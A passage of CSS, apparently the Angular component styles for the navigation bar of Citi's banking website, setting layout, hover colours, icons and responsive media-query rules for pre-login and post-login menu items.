      }
    }

    [_nghost-ssr-c131] #navOpenAccMainLI:hover {
      width: 100%
    }

    [_nghost-ssr-c131] #navOpenAccMainLI a:hover {
      color: #fff;
      background: #056dae
    }

    [_nghost-ssr-c131] #navOpenAccMainLI a:after {
      content: "";
      background-image: url(https://www.citi.com/cbol-pre-login-static-assets/citi-branding-assets/images/right-white-chevi.svg);
      background-repeat: no-repeat;
      font-size: 18px;
      position: absolute;
      top: 17px;
      right: -3px;
      width: 20px;
      height: 20px
    }

    #searchLi[_ngcontent-ssr-c131] {
      right: 10%;
      height: 100%;
      position: absolute
    }

    #searchLi[_ngcontent-ssr-c131]:hover {
      background: #056dae
    }

    #searchLi[_ngcontent-ssr-c131]:focus {
      outline: -webkit-focus-ring-color auto 1px !important
    }

    #searchLi[_ngcontent-ssr-c131]:after {
      content: "";
      border-left: 1px solid #fff;
      display: block;
      top: 23%;
      height: 57%;
      position: absolute;
      right: 1px
    }

    @media (max-width:1170px) {
      #searchLi[_ngcontent-ssr-c131] citi-cta.en_US[_ngcontent-ssr-c131] button {
        font-size: 0 !important
      }
    }

    @media (max-width:1400px) {
      #searchLi[_ngcontent-ssr-c131] citi-cta.es_US[_ngcontent-ssr-c131] button {
        font-size: 0 !important
      }
    }

    #searchLi[_ngcontent-ssr-c131] citi-cta[_ngcontent-ssr-c131] button {
      display: flex;
      outline: 0;
      align-items: center;
      text-align: center;
      margin: 0;
      padding: 11px 15px 11px 17px;
      font-size: 16px;
      color: #fff;
      justify-content: space-around;
      font-family: Interstate_Bold, sans-serif;
      text-decoration: none
    }

    #searchLi[_ngcontent-ssr-c131] citi-cta[_ngcontent-ssr-c131] button:before {
      content: "";
      display: block;
      width: 24px;
      height: 24px;
      margin-right: 10px;
      padding: 10px 10px 10px 17px;
      outline: 0;
      background-image: url();
      background-position: center center;
      background-repeat: no-repeat
    }

    #searchLi[_ngcontent-ssr-c131] citi-cta[_ngcontent-ssr-c131] button:focus {
      outline: -webkit-focus-ring-color auto 5px !important
    }

    @media only screen and (min-device-width:320px) and (max-device-width:360px) and (orientation:portrait) {
      .citiNavSearch[_ngcontent-ssr-c131] button {
        font-size: 11px !important
      }
    }

    @media only screen and (min-device-width:320px) and (max-device-width:568px) and (orientation:portrait) and (max-width:1120px) {
      .citiNavSearch[_ngcontent-ssr-c131] {
        position: absolute;
        right: 111px;
        top: 0;
        display: block;
        height: 100%
      }

      .citiNavSearch[_ngcontent-ssr-c131]:after {
        right: -3px !important
      }
    }

    @media only screen and (min-device-width:320px) and (max-device-width:568px) and (orientation:portrait) {
      .citiNavSearch[_ngcontent-ssr-c131] button {
        padding-top: 12px !important;
        padding-left: 0 !important;
        padding-right: 0 !important
      }

      .citiNavSearch[_ngcontent-ssr-c131] button:before {
        margin-right: 0 !important
      }

      .signOnMobileLink[_ngcontent-ssr-c131] {
        padding-left: 0 !important
      }
    }

    .citiNavSearch[_ngcontent-ssr-c131] {
      display: none
    }

    .citiNavSearch[_ngcontent-ssr-c131]:focus,
    .citiNavSearch[_ngcontent-ssr-c131]:hover {
      background: #056dae;
      color: #fff
    }

    .citiNavSearch[_ngcontent-ssr-c131] button {
      display: flex;
      align-items: center;
      margin: 0;
      padding: 11px 15px 11px 17px;
      font-size: 16px;
      color: #fff;
      justify-content: space-around;
      font-family: Interstate_Bold, sans-serif;
      text-decoration: none
    }

    .citiNavSearch[_ngcontent-ssr-c131] button:focus,
    .citiNavSearch[_ngcontent-ssr-c131] button:hover {
      background: #056dae;
      color: #fff
    }

    .citiNavSearch[_ngcontent-ssr-c131] button:before {
      content: "";
      display: block;
      width: 20px;
      height: 20px;
      margin-right: 10px;
      outline: 0;
      background-image: url();
      background-position: center center;
      background-repeat: no-repeat;
      padding: 12px 10px 10px 17px
    }

    @media screen and (max-width:1120px) {
      .citiNavSearch[_ngcontent-ssr-c131] {
        position: absolute;
        right: 111px;
        top: 0;
        display: block;
        height: 100%
      }

      .citiNavSearch[_ngcontent-ssr-c131]:after {
        content: "";
        height: 56%;
        border-right: 1px solid #fff;
        border: -43px;
        display: block;
        position: absolute;
        margin-bottom: -26px;
        top: 10px;
        right: 5px
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] {
        display: flex;
        flex-direction: column;
        box-shadow: none;
        padding-left: 0;
        z-index: 2;
        background: 0 0;
        overflow-x: hidden;
        min-height: 650px;
        box-shadow: none !important
      }

      .subMenuMainContainer[_ngcontent-ssr-c131] {
        display: block;
        position: absolute;
        z-index: 9;
        width: 100%;
        top: 0
      }

      .subMenuGroupParent[_ngcontent-ssr-c131] {
        width: 100%
      }

      .preLogin[_ngcontent-ssr-c131] .mainListItems[_ngcontent-ssr-c131] {
        list-style: none;
        border-bottom: 5px solid #eee;
        height: 56px;
        background-color: #fff;
        margin: -2px
      }

      .preLogin[_ngcontent-ssr-c131] .mainListItems[_ngcontent-ssr-c131]:hover {
        background-color: none
      }

      .mainListItems[_ngcontent-ssr-c131] {
        list-style: none;
        border-bottom: #eee;
        height: 56px
      }

      .mainListItems[_ngcontent-ssr-c131] [_ngcontent-ssr-c131]:hover {
        background-color: none
      }
    }

    @media screen and (max-width:280px) {
      .citiNavSearch[_ngcontent-ssr-c131] {
        right: 68px
      }

      .citiNavSearch[_ngcontent-ssr-c131] button {
        font-size: 15px;
        padding: 11px 9px 0 0
      }

      .citiNavSearch[_ngcontent-ssr-c131] button:before {
        margin-right: 1px
      }
    }

    @media screen and (max-width:1120px) and (min-width:992px) {
      .flexColumnContainer[_ngcontent-ssr-c131] {
        background: #fff !important;
        margin-top: 0 !important
      }

      .child-nav-group3[_ngcontent-ssr-c131] {
        display: flex;
        flex-direction: column
      }

      [_nghost-ssr-c131] #navOpenAccMainLI {
        width: 100%;
        text-align: center;
        height: 80px
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a {
        position: absolute;
        color: #056dae;
        width: 100% !important;
        background-color: #fff !important;
        line-height: 30px;
        padding-bottom: 12px;
        box-shadow: rgba(0, 0, 0, .125) 0 2px 4px
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a:hover {
        line-height: 30px;
        background: #fff;
        color: #056dae;
        padding-bottom: 12px;
        border-bottom: 1px solid #eee
      }
    }

    [_nghost-ssr-c131] #navOpenAccMainLI a {
      font-family: Interstate_Bold, sans-serif;
      position: absolute;
      color: #fff;
      width: 175px;
      line-height: 20px;
      padding-bottom: 12px;
      padding-top: 13px
    }

    @media screen and (min-width:1120px) {
      [_nghost-ssr-c131] #navOpenAccMainLI a:hover {
        background: #056dae;
        color: #fff;
        padding-bottom: 12px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 {
        display: flex;
        flex-direction: column;
        justify-content: space-evenly;
        width: 24% !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subHeadersOnMobile {
        display: none
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subMenuGroupUL {
        margin-top: 0;
        flex: 1 0 80%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subMenuGroupUL .subMenuGroupLI {
        line-height: 2.5;
        width: auto
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .quickLinks {
        flex: 1 0 10%
      }
    }

    @media screen and (max-width:1119.9px) {
      [_nghost-ssr-c131] #navOpenAccMainLI a {
        box-shadow: rgba(0, 0, 0, .125) 0 2px 4px !important;
        background-color: #fff;
        color: #056dae;
        width: 100% !important
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a:hover {
        line-height: 30px;
        background: #fff;
        color: #056dae;
        padding-bottom: 12px
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #investingMainLI .subMenuGroupParent .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }
    }

    @media screen and (max-width:991.9px) {
      [_nghost-ssr-c131] #navOpenAccMainLI {
        width: 100%;
        text-align: center;
        height: 80px
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a {
        position: absolute;
        color: #056dae;
        width: 100% !important;
        background-color: #fff !important;
        line-height: 30px;
        padding-bottom: 12px;
        border-bottom: 1px solid #eee
      }

      [_nghost-ssr-c131] #navOpenAccMainLI a:hover {
        line-height: 30px;
        background: #fff;
        color: #056dae;
        padding-bottom: 12px;
        border-bottom: 1px solid #eee
      }
    }

    .subNavtitleMain[_ngcontent-ssr-c131] {
      width: 90%;
      border-bottom: 1px solid #eee;
      height: 4em;
      margin-left: 21px;
      margin-bottom: 25px
    }

    .subNavTitle[_ngcontent-ssr-c131] {
      position: absolute;
      left: 52px;
      color: #000;
      top: 19px;
      width: 90%;
      padding-bottom: 8px;
      font-weight: 600
    }

    .subNavTitle[_ngcontent-ssr-c131]::before {
      content: "";
      background-image: url(assets/img/chevronLeft.svg);
      background-repeat: no-repeat;
      font-size: 18px;
      position: absolute;
      top: 5px;
      left: -33px;
      width: 20px;
      height: 20px
    }

    .closeSideNav[_ngcontent-ssr-c131] {
      display: block;
      width: 100%;
      height: 100%;
      z-index: 9;
      position: absolute;
      transform: translateX(100%);
      transition: .5s ease-in
    }

    .openSideNav[_ngcontent-ssr-c131] {
      display: block;
      width: 100%;
      height: 100%;
      z-index: 9;
      position: absolute;
      transform: translateX(0);
      transition: .5s ease-in
    }

    .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerATMMainLI a {
      color: #056dae
    }

    @media screen and (max-width:700px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI citi-modal .modal {
        top: 13%
      }
    }

    @media screen and (max-width:1660px) and (min-width:1120px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] .child-nav-group3 .explore-sub-navId {
        display: none !important
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] .child-nav-group3 .subMenuGroupTitle a {
        display: none !important
      }
    }

    @media screen and (min-width:1119.9px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navlendingMainLI .subMenuGroupParent .flexColumnContainer {
        height: 90vh !important
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navlendingMainLI .subMenuGroupParent .flexColumnContainer .child-nav-group3 .subMenuGroupUL {
        width: 300px
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #navlendingMainLI .subMenuGroupParent .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupTitle .subHeadersOnMobile {
      display: none
    }

    @media screen and (max-width:1119.9px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #wealthMgmntMainLI .subMenuGroupParent .flexColumnContainer .subNavtitleMain {
        padding-bottom: 0 !important;
        margin-bottom: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuGroupParent .flexColumnContainer {
        height: 620px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subMenuGroupTitle {
        color: #999;
        line-height: 3.5;
        padding-left: 8%;
        position: relative;
        border-bottom: 1px solid #eee;
        margin-left: 15px;
        margin-right: 26px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subMenuGroupTitle a {
        color: #000;
        font-weight: 600
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .child-nav-group3 .subMenuGroupTitle a:after {
        content: "";
        background-image: url();
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 17px;
        right: -8px;
        width: 20px;
        height: 20px
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer {
      position: absolute !important;
      left: 15%
    }

    @media screen and (max-width:1120px) {
      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerATMMainLI a:after {
        display: none
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerATMMainLI a:before {
        content: "";
        background-image: url(assets/img/location.svg);
        background-repeat: no-repeat;
        background-size: 25px 25px;
        width: 25px;
        height: 25px;
        display: inline-block;
        position: absolute;
        top: 7px;
        left: 16px;
        pointer-events: none;
        filter: invert(.5) sepia(1) saturate(70) hue-rotate(178deg)
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI {
        border-bottom: none
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI a:after {
        display: none
      }

      .preLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #butlerEspanolMainLI a:before {
        content: "";
        background-image: url(assets/img/globe.svg);
        background-repeat: no-repeat;
        background-size: 25px 25px;
        width: 25px;
        height: 25px;
        display: inline-block;
        position: absolute;
        pointer-events: none;
        top: 7px;
        left: 16px;
        filter: invert(.5) sepia(1) saturate(70) hue-rotate(178deg)
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer {
        left: 0
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer .subMenuGroupParent {
        width: 100% !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer .subMenuGroupParent .subNavtitleMain {
        margin-bottom: 10px !important
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL {
      display: flex;
      flex-basis: 100%
    }

    @media screen and (min-width:1119.9px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI .subMenuMainContainer .subMenuGroupParent {
        height: 358px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL {
        padding-left: 20px
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI {
      list-style: none
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI:nth-child(1) {
      margin-top: 0 !important
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .child-links {
      padding-left: 0;
      font-size: 16px;
      color: #666;
      letter-spacing: 0;
      line-height: 20px;
      font-family: Interstate_Light, sans-serif
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .explore-sub-nav #exploreUl {
      padding: 0
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .explore-sub-nav #exploreUl li {
      list-style: none;
      line-height: 2.5
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .explore-sub-nav #exploreUl li a {
      font-family: Interstate_Light, sans-serif;
      font-size: 16px;
      color: #000;
      letter-spacing: 0;
      line-height: 22px
    }

    @media screen and (max-width:1118px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI .subMenuMainContainer .subMenuGroupParent .flexColumnContainer child-nav-group3 .subMenuGroupTitle {
        display: none
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 .flexColumnContainer {
        height: 90vh !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 .flexColumnContainer .subNavtitleMain {
        margin-bottom: 5px !important
      }
    }

    @media screen and (max-width:991px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 .flexColumnContainer {
        height: 620px !important
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI {
      display: none
    }

    @media screen and (max-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL {
        flex-direction: column;
        display: none !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .explore-sub-nav #exploreUl li {
        line-height: 48px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .explore-sub-nav #exploreUl li a {
        color: #002d72 !important;
        font-family: Interstate_Regular, sans-serif;
        font-weight: 600
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #chensavns a {
        position: relative;
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #chensavns a::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #ccs a {
        position: relative;
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #ccs a::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #invsg a {
        position: relative;
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #invsg a::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #lendng a {
        position: relative;
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #lendng a::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #welman a {
        position: relative;
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL #welman a::after {
        content: "";
        background-image: url(assets/img/chevronRight.png);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 10px;
        right: 15px;
        width: 20px;
        height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI {
        display: block
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .mobileHeadingAnchorTag {
        display: none
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subHeadersOnMobile {
        font-weight: 600;
        padding-left: 44px;
        font-family: Interstate_Regular, sans-serif;
        font-size: 12px;
        color: #666;
        letter-spacing: 0;
        line-height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subMenuMainContainer .subNavTitle:before {
        left: -33px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subMenuMainContainer .child-nav-group3 {
        padding-bottom: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupUL {
        padding-top: 0 !important;
        width: 100% !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupUL .mobileHeadingAnchorTag {
        display: none
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupUL .subHeadersOnMobile {
        margin-left: 43px;
        font-family: Interstate_Regular, sans-serif;
        font-size: 12px;
        color: #666;
        letter-spacing: 0;
        line-height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #profilesNavMainLI .main-links:before {
        content: "";
        background-image: url();
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 8px;
        left: 10px;
        width: 20px;
        height: 20px
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #ATMNavMainLI {
      display: none
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #ATMNavMainLI a:after {
      display: none
    }

    @media screen and (min-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 {
        height: 160px;
        width: 260px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 {
        width: 100%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL {
        margin-top: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL li {
        line-height: 2.5
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL #somElement {
        width: 75%;
        position: absolute
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL #somElement .somInsideChildNav {
        float: right
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL #somElement .somInsideChildNav citi-som {
        position: absolute
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent {
        width: 260px !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .subMenuGroupUL {
        margin-top: 0
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .subMenuGroupUL .subMenuGroupLI {
        line-height: 2.5;
        width: 222px
      }
    }

    @media screen and (max-width:1119.9px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #expProductsMainLI child-nav-group3 .subMenuGroupUL .subMenuGroupLI .child-links {
        font-size: 16px;
        font-family: Interstate_Light, sans-serif;
        color: #000;
        line-height: 20px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .flexColumnContainer {
        height: 620px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .flexColumnContainer .subNavtitleMain {
        margin-bottom: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .subMenuGroupUL {
        margin-top: 0;
        padding-top: 0 !important;
        width: 100% !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .subMenuGroupUL .subMenuGroupLI {
        line-height: 2.5;
        width: 222px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #servicesMainLI .subMenuGroupParent .subMenuGroupUL .subMenuGroupLI a {
        font-weight: 600
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #openAccPostMainLI a {
        text-align: center;
        font-family: Interstate_Bold, sans-serif;
        font-size: 16px;
        color: #056dae;
        letter-spacing: 0;
        line-height: 38px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #openAccPostMainLI a:after {
        display: none
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupTitle .mobileHeadingAnchorTag {
      display: none
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupTitle .subHeadersOnMobile {
      margin-left: 43px;
      font-family: Interstate_Regular, sans-serif;
      font-size: 12px;
      color: #666;
      letter-spacing: 0;
      line-height: 20px;
      font-weight: 600
    }

    @media screen and (max-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #ATMNavMainLI {
        display: block
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #ATMNavMainLI a:before {
        content: "";
        background-image: url(assets/img/050-location@2x.svg);
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 8px;
        left: 10px;
        width: 33px;
        height: 25px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupUL {
        width: 100%;
        padding-top: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuMainContainer .child-nav-group3 .subMenuGroupUL .subMenuGroupLI {
        height: 32px;
        margin-top: 3px !important
      }
    }

    @media screen and (min-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent {
        width: 470px !important;
        min-height: 120px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent .child-nav-group3 {
        display: flex;
        flex-direction: column
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent .child-nav-group3 .subMenuGroupUL {
        margin-top: 0;
        flex: 1 0 80%
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent .child-nav-group3 .subMenuGroupUL .subMenuGroupLI {
        line-height: 2.5;
        width: 220px
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent .child-nav-group3 .quickLinks {
        flex: 1 0 10%
      }

